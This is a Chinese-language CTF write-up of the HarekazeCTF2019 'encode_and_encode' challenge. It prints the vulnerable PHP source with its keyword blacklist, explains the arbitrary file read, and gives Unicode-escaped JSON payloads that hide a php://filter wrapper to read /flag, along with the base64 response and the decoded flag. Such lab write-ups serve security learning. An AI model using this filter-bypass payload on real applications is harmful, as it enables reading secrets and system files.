---
title: HarekazeCTF2019-encode_and_encode
date: 2025-04-08 22:03:57
tags:
- 代码审计
- php伪协议
- json绕过
category:
- 刷题笔记
---

# HarekazeCTF2019-encode_and_encode

## 知识点

### json_decode

**这个函数可以解析Unicode，所以我们可以通过Unicode编码来绕过黑名单或者关键字过滤**

例如

```
php://filter/convert.base64-encode/resource=/flag

{"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}
```



---

首先打开，看到源码

```
<?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]);
```

代码审计

```
<?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
//用变量body获取post数据
$json = json_decode($body, true);
//对body变量进行json解码

if (is_valid($body) && isset($json) && isset($json['page'])) {//判断body变量是否有效，json数据要有page
  $page = $json['page'];
  $content = file_get_contents($page);//从page中读出文件名，并读取文件
  if (!$content || !is_valid($content)) {//检查content是否有效,即不能明文传输flag文件，利用php伪协议绕过
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);//如果查到content里有ctf，用censored替代
echo json_encode(['content' => $content]);//最后将json编码后的content输出

```

这里有一个is_valid函数，相当于黑名单，过滤了一些关键字，之后就是接收数据流和json的解码了。

最后我们要通过$content = file_get_contents($page);这行代码来利用任意文件读取漏洞，使用php的伪协议来读取/flag的内容，然后读出的内容经过$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);这行代码加工后，读出来的内容会通过echo json_encode(['content' => $content]);将我们读取到的内容通过json的格式返回给我们。

所以需要绕过两次waf，一个黑名单，一个content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{<censored>}',这个函数加工了。

---

绕过黑名单我们可以使用Unicode编码，而绕过preg_replace直接用伪协议php://filter/convert.base64-encode/resourc=/flag，使/flag的内容被 filter 处理，最终通过 base64 编码的形式返回.

**payload：**

```
{"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}

或

php://filter/read=convert.base64-encode/resource=/flag

{"page":"\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"}
```

在bp中提交post请求即可

回显

```
{"content":"ZmxhZ3swMDI3ODQ3YS02ODVhLTQxZjItYWI1Yi1lYzNlNWY2MjhmMjd9Cg=="}
```

base64解码

```
flag{0027847a-685a-41f2-ab5b-ec3e5f628f27}
```

